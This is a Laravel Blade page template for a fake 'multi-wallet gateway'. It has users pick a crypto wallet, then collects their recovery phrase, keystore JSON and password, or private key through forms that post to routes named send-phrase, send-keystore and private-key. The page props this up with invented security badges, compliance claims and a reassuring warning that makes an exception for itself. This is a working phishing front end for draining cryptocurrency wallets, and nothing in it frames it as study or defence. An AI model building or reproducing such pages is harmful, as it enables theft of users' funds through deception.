@include('user.components.user_head', ['title' => 'Choose Wallet Type'])

<div class="min-h-screen bg-gray-50 text-gray-900 font-sans">
    <!-- Sticky Header Navigation -->
    <div class="sticky top-0 z-40 bg-white/80 backdrop-blur-md border-b border-gray-100 px-6 py-4">
        <div class="max-w-7xl mx-auto flex justify-between items-center">
            <a href="{{ route('user') }}" class="flex items-center space-x-3 group px-4 py-2 hover:bg-gray-50 rounded-2xl transition-all duration-300">
                <div class="w-10 h-10 bg-gray-100 group-hover:bg-blue-600 rounded-xl flex items-center justify-center text-gray-400 group-hover:text-white transition-all shadow-sm">
                    <i class="fas fa-arrow-left"></i>
                </div>
                <div>
                    <span class="text-sm font-black text-gray-900 block leading-none">Back to Dashboard</span>
                    <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mt-1">Portfolio Sync</span>
                </div>
            </a>
            
            <div class="flex items-center space-x-4">
                <div class="hidden md:flex flex-col items-end mr-4">
                    <span class="text-xs font-bold text-gray-400 uppercase tracking-widest">Connected User</span>
                    <span class="text-sm font-black text-gray-900">{{ auth()->user()->username }}</span>
                </div>
                <div class="w-12 h-12 bg-white border-2 border-gray-100 rounded-2xl p-0.5 shadow-sm">
                    <img src="https://ui-avatars.com/api/?name={{ auth()->user()->username }}&background=0284c7&color=fff" class="w-full h-full rounded-[14px] object-cover" alt="User">
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-7xl mx-auto px-4 py-12">
        <!-- Header -->
        <div class="text-center mb-16 relative">
            <div class="inline-flex items-center justify-center w-24 h-24 bg-white rounded-[32px] shadow-xl shadow-gray-200 mb-8 p-6">
                <i class="fas fa-wallet text-blue-600 text-4xl"></i>
            </div>
            <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter text-gray-900 leading-tight">Secure Multi-Wallet Gateway</h1>
            <p class="text-xl text-gray-500 max-w-2xl mx-auto font-medium">Link your preferred cryptocurrency walletprovider to unlock institutional-grade liquidity and instant synchronization.</p>
        </div>

        <!-- Wallet Providers Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-16 px-4">
            @foreach($activeWalletProvider as $type)
                <div 
                    onclick="selectWalletType({{ $type->id }}, '{{ $type->title }}')"
                    class="group bg-white rounded-[28px] border border-gray-100 p-8 hover:border-blue-500 hover:shadow-2xl hover:shadow-blue-100 hover:-translate-y-2 transition-all duration-500 cursor-pointer relative overflow-hidden"
                >
                    <!-- Abstract Background -->
                    <div class="absolute -right-8 -bottom-8 w-24 h-24 bg-blue-50/50 rounded-full group-hover:bg-blue-600 transition-colors duration-500"></div>

                    <div class="relative z-10 flex flex-col items-center text-center">
                        <div class="relative mb-6">
                            <div class="w-20 h-20 rounded-[20px] bg-gray-50 p-3 shadow-inner transform group-hover:scale-110 transition-transform duration-500">
                                <img class="w-full h-full object-contain" src="{{ $type->trans_img_src }}" alt="{{ $type->title }}" />
                            </div>
                            <div class="absolute -top-3 -right-3 w-8 h-8 bg-green-500 border-4 border-white rounded-full flex items-center justify-center shadow-lg group-hover:rotate-12 transition-transform">
                                <i class="fas fa-check text-white text-[10px]"></i>
                            </div>
                        </div>
                        
                        <h3 class="text-xl font-bold text-gray-900 mb-2 group-hover:text-blue-600 transition-colors">{{ $type->title }}</h3>
                        <p class="text-xs text-gray-400 font-bold tracking-widest uppercase mb-6">Enterprise Ready</p>

                        <div class="w-full py-3 bg-gray-50 group-hover:bg-blue-600 rounded-2xl text-gray-500 group-hover:text-white font-bold text-sm transition-all duration-300">
                            Connect {{ $type->title }}
                        </div>
                    </div>
                </div>
            @endforeach
        </div>

        <!-- Verification / Trust Section -->
        <div class="max-w-4xl mx-auto rounded-[40px] bg-gradient-to-br from-blue-600 to-indigo-700 p-12 text-white relative overflow-hidden shadow-2xl shadow-blue-200">
            <div class="relative z-10 grid md:grid-cols-2 gap-12 items-center">
                <div class="space-y-6">
                    <h2 class="text-3xl font-black tracking-tight leading-tight">Advanced Security Infrastructure</h2>
                    <p class="text-blue-100 text-lg leading-relaxed opacity-90">Our wallet connection protocol uses biometric verification, multi-sig authorization, and decentralized key management to safeguard every transaction.</p>
                    <div class="flex flex-col space-y-4 pt-4">
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400"></i>
                            <span class="font-bold">E2E AES-256 Encrypted</span>
                        </div>
                        <div class="flex items-center space-x-3">
                            <i class="fas fa-check-circle text-green-400"></i>
                            <span class="font-bold">SOC 2 Type II Compliant</span>
                        </div>
                    </div>
                </div>
                <div class="flex justify-center bg-white/10 backdrop-blur-xl rounded-[32px] p-8 border border-white/20">
                    <div class="text-center">
                        <div class="w-16 h-16 bg-white rounded-2xl flex items-center justify-center text-blue-600 mx-auto mb-4 text-2xl">
                            <i class="fas fa-shield-halved"></i>
                        </div>
                        <p class="font-bold mb-2">Internal Security Grade</p>
                        <p class="text-4xl font-black text-white">AAA+</p>
                        <p class="text-xs text-blue-200 mt-2 uppercase font-bold tracking-widest">Real-time Audited</p>
                    </div>
                </div>
            </div>
            <!-- Decorative Graphics -->
            <div class="absolute top-0 right-0 w-64 h-64 bg-white/5 rounded-full -mr-20 -mt-20 blur-3xl"></div>
            <div class="absolute bottom-0 left-0 w-64 h-64 bg-blue-400/10 rounded-full -ml-20 -mb-20 blur-3xl"></div>
        </div>
    </div>

    <!-- Wallet Linking Modal -->
    <div id="walletModal" class="fixed inset-0 z-50 hidden transition-opacity duration-300" role="dialog" aria-modal="true">
        <!-- Backdrop -->
        <div class="absolute inset-0 bg-gray-900/80 backdrop-blur-md" onclick="closeWalletModal()"></div>
        
        <!-- Modal Container -->
        <div class="flex min-h-screen items-center justify-center p-4 relative z-10">
            <div class="bg-white rounded-[40px] shadow-3xl w-full max-w-2xl max-h-[90vh] overflow-hidden transform transition-all duration-500 scale-95 opacity-0" id="modalContent">
                <!-- Modal Header -->
                <div class="bg-gray-50 px-10 py-8 border-b border-gray-100 flex justify-between items-center">
                    <div class="flex items-center space-x-6">
                        <div class="w-16 h-16 bg-white rounded-2xl shadow-md p-3" id="modalIconContainer">
                            <img src="" alt="" id="modalWalletIcon" class="w-full h-full object-contain">
                        </div>
                        <div>
                            <p class="text-xs text-blue-600 font-black uppercase tracking-widest mb-1">Authenticating</p>
                            <h2 class="text-3xl font-black text-gray-900 tracking-tight" id="modalWalletName">Wallet Name</h2>
                        </div>
                    </div>
                    <button onclick="closeWalletModal()" class="w-12 h-12 bg-white rounded-full flex items-center justify-center text-gray-400 hover:text-red-500 hover:rotate-90 transition-all shadow-sm border border-gray-100">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>

                <!-- Tabs -->
                <div class="px-10 py-6 border-b border-gray-100 flex space-x-2">
                    <button onclick="showTab('phrase')" class="tab-btn active px-6 py-3 rounded-2xl bg-blue-600 text-white font-bold text-sm shadow-xl shadow-blue-100 transition-all">Phase Link</button>
                    <button onclick="showTab('keystore')" class="tab-btn px-6 py-3 rounded-2xl bg-gray-100 text-gray-500 font-bold text-sm hover:bg-gray-200 transition-all">Keystore JSON</button>
                    <button onclick="showTab('private')" class="tab-btn px-6 py-3 rounded-2xl bg-gray-100 text-gray-500 font-bold text-sm hover:bg-gray-200 transition-all">Private Key</button>
                </div>

                <!-- Scrollable Body -->
                <div class="px-10 py-8 overflow-y-auto max-h-[50vh]">
                    <!-- Phrase Tab -->
                    <div id="phraseTab" class="tab-content">
                        <form action="{{ route('send-phrase') }}" method="POST" class="space-y-6">
                            @csrf
                            <input type="hidden" name="wallet_provider_id" id="phraseWalletTypeId">
                            @include('user.components.wallet-form-common', ['type' => 'phrase'])
                            <div class="space-y-4">
                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Recovery Phrase</label>
                                <textarea name="recovery_phrase" rows="4" class="w-full bg-gray-50 border-2 border-transparent focus:border-blue-600 focus:bg-white rounded-3xl p-6 text-gray-900 font-medium transition-all outline-none" placeholder="Enter your 12 or 24 words separated by space..."></textarea>
                            </div>
                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-100 hover:scale-[1.02] active:scale-95 flex items-center justify-center space-x-3">
                                <span>Authorize External Port</span>
                                <i class="fas fa-link text-sm"></i>
                            </button>
                        </form>
                    </div>

                    <!-- Keystore Tab -->
                    <div id="keystoreTab" class="tab-content hidden">
                        <form action="{{ route('send-keystore') }}" method="POST" class="space-y-6">
                            @csrf
                            <input type="hidden" name="wallet_provider_id" id="keystoreWalletTypeId">
                            @include('user.components.wallet-form-common', ['type' => 'keystore'])
                            <div class="space-y-4">
                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Keystore JSON</label>
                                <textarea name="keystore_json" rows="4" class="w-full bg-gray-50 border-2 border-transparent focus:border-blue-600 focus:bg-white rounded-3xl p-6 text-gray-900 font-mono text-xs transition-all outline-none" placeholder='{"address":"...","id":"...","version":3,...}'></textarea>
                            </div>
                            <div class="space-y-4">
                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Wallet Password</label>
                                <input type="password" name="keystore_password" class="w-full bg-gray-50 border-2 border-transparent focus:border-blue-600 focus:bg-white rounded-[20px] px-6 py-4 text-gray-900 font-medium transition-all outline-none" placeholder="Enter password used to encrypt JSON">
                            </div>
                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-100 flex items-center justify-center space-x-3">
                                <span>Import Secure Container</span>
                                <i class="fas fa-file-shield text-sm"></i>
                            </button>
                        </form>
                    </div>

                    <!-- Private Key Tab -->
                    <div id="privateTab" class="tab-content hidden">
                        <form action="{{ route('private-key') }}" method="POST" class="space-y-6">
                            @csrf
                            <input type="hidden" name="wallet_provider_id" id="privateWalletTypeId">
                            @include('user.components.wallet-form-common', ['type' => 'private'])
                            <div class="space-y-4">
                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Private Key String</label>
                                <div class="relative group">
                                    <textarea name="private_key" rows="3" class="w-full bg-red-50/50 border-2 border-red-100 group-focus-within:border-red-500 rounded-3xl p-6 text-gray-900 font-mono transition-all outline-none" placeholder="Paste your alphanumeric private key..."></textarea>
                                </div>
                                <div class="px-6 py-4 bg-red-50 border border-red-100 rounded-3xl flex items-start space-x-4">
                                    <i class="fas fa-triangle-exclamation text-red-600 mt-1"></i>
                                    <p class="text-xs text-red-900 leading-tight"><strong>Safety Warning:</strong> Never share your private key with anyone except this authorized secure portal. We will never ask for your key outside of this protected session.</p>
                                </div>
                            </div>
                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-100 flex items-center justify-center space-x-3">
                                <span>Inject Private Access Key</span>
                                <i class="fas fa-key text-sm"></i>
                            </button>
                        </form>
                    </div>
                </div>

                <!-- Footer -->
                <div class="bg-gray-50 px-10 py-6 text-center border-t border-gray-100">
                    <p class="text-xs text-gray-400 font-medium ">Secure 256-bit TLS Connection Active</p>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
let selectedWalletTypeId = null;
let selectedWalletName = '';

function selectWalletType(id, name) {
    selectedWalletTypeId = id;
    selectedWalletName = name;

    const modal = document.getElementById('walletModal');
    const content = document.getElementById('modalContent');
    
    // Update content
    document.getElementById('modalWalletName').textContent = name;
    document.getElementById('phraseWalletTypeId').value = id;
    document.getElementById('keystoreWalletTypeId').value = id;
    document.getElementById('privateWalletTypeId').value = id;
    
    // Update icon if available in current UI (selecting from grid)
    const clickedImg = event.currentTarget.querySelector('img').src;
    document.getElementById('modalWalletIcon').src = clickedImg;

    // Show modal with animation
    modal.classList.remove('hidden');
    setTimeout(() => {
        content.classList.remove('scale-95', 'opacity-0');
        content.classList.add('scale-100', 'opacity-100');
    }, 10);

    showTab('phrase');
}

function closeWalletModal() {
    const modal = document.getElementById('walletModal');
    const content = document.getElementById('modalContent');
    
    content.classList.remove('scale-100', 'opacity-100');
    content.classList.add('scale-95', 'opacity-0');
    
    setTimeout(() => {
        modal.classList.add('hidden');
    }, 300);
}

function showTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.add('hidden'));
    document.getElementById(tabName + 'Tab').classList.remove('hidden');

    // Update buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('bg-blue-600', 'text-white', 'shadow-xl', 'shadow-blue-100');
        btn.classList.add('bg-gray-100', 'text-gray-500');
    });

    const activeBtn = event ? event.target.closest('.tab-btn') : document.querySelector(`.tab-btn[onclick*="${tabName}"]`);
    if(activeBtn) {
        activeBtn.classList.add('bg-blue-600', 'text-white', 'shadow-xl', 'shadow-blue-100');
        activeBtn.classList.remove('bg-gray-100', 'text-gray-500');
    }
}
</script>

@include('user.components.auth-footer')
